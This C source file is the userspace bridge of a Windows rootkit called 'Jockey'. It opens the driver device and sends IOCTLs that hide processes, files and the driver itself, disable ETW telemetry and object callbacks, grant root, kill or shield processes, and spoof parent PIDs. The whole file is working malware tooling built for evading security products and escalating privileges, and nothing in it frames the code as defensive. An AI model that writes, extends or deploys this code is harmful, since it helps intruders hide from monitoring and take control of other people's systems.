/*
 * kernel_bridge.c — Userspace bridge to the Jockey Windows kernel driver.
 *
 * Opens \\.\Jockey and sends IOCTLs to the driver for
 * process hiding, file hiding, ETW disable, root, etc.
 */

#include <windows.h>
#include <winioctl.h>
#include "jockey.h"
#include "jky_platform.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


static HANDLE g_jky_fd = INVALID_HANDLE_VALUE;

static int jky_open_dev(void)
{
    if (g_jky_fd != INVALID_HANDLE_VALUE)
        return 0;

      g_jky_fd = CreateFileA("\\\\.\\Jockey",
                           GENERIC_READ | GENERIC_WRITE,
                           0, NULL, OPEN_EXISTING, 0, NULL);
    return (g_jky_fd != INVALID_HANDLE_VALUE) ? 0 : -1;
}

void jky_kmod_close(void)
{
    if (g_jky_fd != INVALID_HANDLE_VALUE) {
        CloseHandle(g_jky_fd);
        g_jky_fd = INVALID_HANDLE_VALUE;
    }
}

int jky_kmod_ensure_loaded(void)
{
    if (jky_open_dev() != 0) return -1;

    DWORD magic = 0x4A4B59;
    DWORD ret;

    BOOL ok = DeviceIoControl(g_jky_fd, JKY_IOCTL_PING,
                              &magic, sizeof(magic),
                              &magic, sizeof(magic),
                              &ret, NULL);

    return ok && (magic == 0x4A4B59) ? 0 : -1;
}

int jky_kmod_hide_pid(int pid)
{
    if (jky_open_dev() != 0) {
        fprintf(stderr, "jockey: open device failed, err=%d\n", GetLastError());
        return -1;
    }

    ULONG req = (ULONG)pid;
    DWORD ret;
    BOOL ok = DeviceIoControl(g_jky_fd, JKY_IOCTL_HIDE_PID,
                              &req, sizeof(req),
                              &req, sizeof(req), &ret, NULL);
    if (!ok) {
        fprintf(stderr, "jockey: HIDE_PID ioctl failed, pid=%lu, err=%d\n",
                req, GetLastError());
    }
    return ok ? 0 : -1;
}

int jky_kmod_unhide_pid(int pid)
{
    if (jky_open_dev() != 0) {
        fprintf(stderr, "jockey: open device failed, err=%d\n", GetLastError());
        return -1;
    }

    ULONG req = (ULONG)pid;
    DWORD ret;
    BOOL ok = DeviceIoControl(g_jky_fd, JKY_IOCTL_UNHIDE_PID,
                              &req, sizeof(req),
                              &req, sizeof(req), &ret, NULL);
    if (!ok) {
        fprintf(stderr, "jockey: UNHIDE_PID ioctl failed, pid=%lu, err=%d\n",
                req, GetLastError());
    }
    return ok ? 0 : -1;
}

int jky_kmod_hide_file(const char *path)
{
    if (jky_open_dev() != 0) return -1;

    int wlen = MultiByteToWideChar(CP_UTF8, 0, path, -1, NULL, 0);
    wchar_t *wpath = (wchar_t *)malloc(wlen * sizeof(wchar_t));
    MultiByteToWideChar(CP_UTF8, 0, path, -1, wpath, wlen);

    struct {
        ULONG magic;
        wchar_t filepath[260];
    } req;
    req.magic = JKY_IOCTL_MAGIC;
    wcsncpy(req.filepath, wpath, 259);
    req.filepath[259] = 0;
    free(wpath);

    DWORD ret;
    BOOL ok = DeviceIoControl(g_jky_fd, JKY_IOCTL_HIDE_FILE,
                              &req, sizeof(req),
                              &req, sizeof(req), &ret, NULL);
    return ok ? 0 : -1;
}

int jky_kmod_unhide_file(const char *path)
{
    if (jky_open_dev() != 0) return -1;

    int wlen = MultiByteToWideChar(CP_UTF8, 0, path, -1, NULL, 0);
    wchar_t *wpath = (wchar_t *)malloc(wlen * sizeof(wchar_t));
    MultiByteToWideChar(CP_UTF8, 0, path, -1, wpath, wlen);

    struct {
        ULONG magic;
        wchar_t filepath[260];
    } req;
    req.magic = JKY_IOCTL_MAGIC;
    wcsncpy(req.filepath, wpath, 259);
    req.filepath[259] = 0;
    free(wpath);

    DWORD ret;
    BOOL ok = DeviceIoControl(g_jky_fd, JKY_IOCTL_UNHIDE_FILE,
                              &req, sizeof(req),
                              &req, sizeof(req), &ret, NULL);
    return ok ? 0 : -1;
}

int jky_kmod_get_root(void)
{
    if (jky_open_dev() != 0) return -1;

    ULONG magic = JKY_IOCTL_MAGIC;
    DWORD ret;
    BOOL ok = DeviceIoControl(g_jky_fd, JKY_IOCTL_GET_ROOT,
                              &magic, sizeof(magic),
                              &magic, sizeof(magic), &ret, NULL);
    return ok ? 0 : -1;
}

int jky_kmod_kill(int pid)
{
    if (jky_open_dev() != 0) return -1;

    struct { ULONG pid; ULONG exit_code; } req = { (ULONG)pid, 0 };
    DWORD ret;
    BOOL ok = DeviceIoControl(g_jky_fd, JKY_IOCTL_KILL_PID,
                              &req, sizeof(req),
                              &req, sizeof(req), &ret, NULL);
    return ok ? 0 : -1;
}

int jky_kmod_disable_etw(void)
{
    if (jky_open_dev() != 0) return -1;

    ULONG magic = JKY_IOCTL_MAGIC;
    DWORD ret;
    BOOL ok = DeviceIoControl(g_jky_fd, JKY_IOCTL_DISABLE_ETW,
                              &magic, sizeof(magic),
                              &magic, sizeof(magic), &ret, NULL);
    return ok ? 0 : -1;
}

int jky_kmod_disable_ob_callbacks(void)
{
    if (jky_open_dev() != 0) return -1;

    ULONG magic = JKY_IOCTL_MAGIC;
    DWORD ret;
    BOOL ok = DeviceIoControl(g_jky_fd, JKY_IOCTL_DISABLE_OB_CB,
                              &magic, sizeof(magic),
                              &magic, sizeof(magic), &ret, NULL);
    return ok ? 0 : -1;
}

int jky_kmod_hide_driver(void)
{
    if (jky_open_dev() != 0) return -1;

    ULONG magic = JKY_IOCTL_MAGIC;
    DWORD ret;
    BOOL ok = DeviceIoControl(g_jky_fd, JKY_IOCTL_HIDE_DRIVER,
                              &magic, sizeof(magic),
                              &magic, sizeof(magic), &ret, NULL);
    return ok ? 0 : -1;
}

int jky_kmod_process_shield(int pid, int level)
{
    if (jky_open_dev() != 0) return -1;

    struct { ULONG pid; ULONG level; } req = { (ULONG)pid, (ULONG)level };
    DWORD ret;
    BOOL ok = DeviceIoControl(g_jky_fd, JKY_IOCTL_PROCESS_SHIELD,
                              &req, sizeof(req),
                              &req, sizeof(req), &ret, NULL);
    return ok ? 0 : -1;
}

int jky_kmod_spoof_ppid(int child_pid, int new_ppid)
{
    if (jky_open_dev() != 0) return -1;

    struct { ULONG child; ULONG parent; } req = { (ULONG)child_pid, (ULONG)new_ppid };
    DWORD ret;
    BOOL ok = DeviceIoControl(g_jky_fd, JKY_IOCTL_SPOOF_PPID,
                              &req, sizeof(req),
                              &req, sizeof(req), &ret, NULL);
    return ok ? 0 : -1;
}
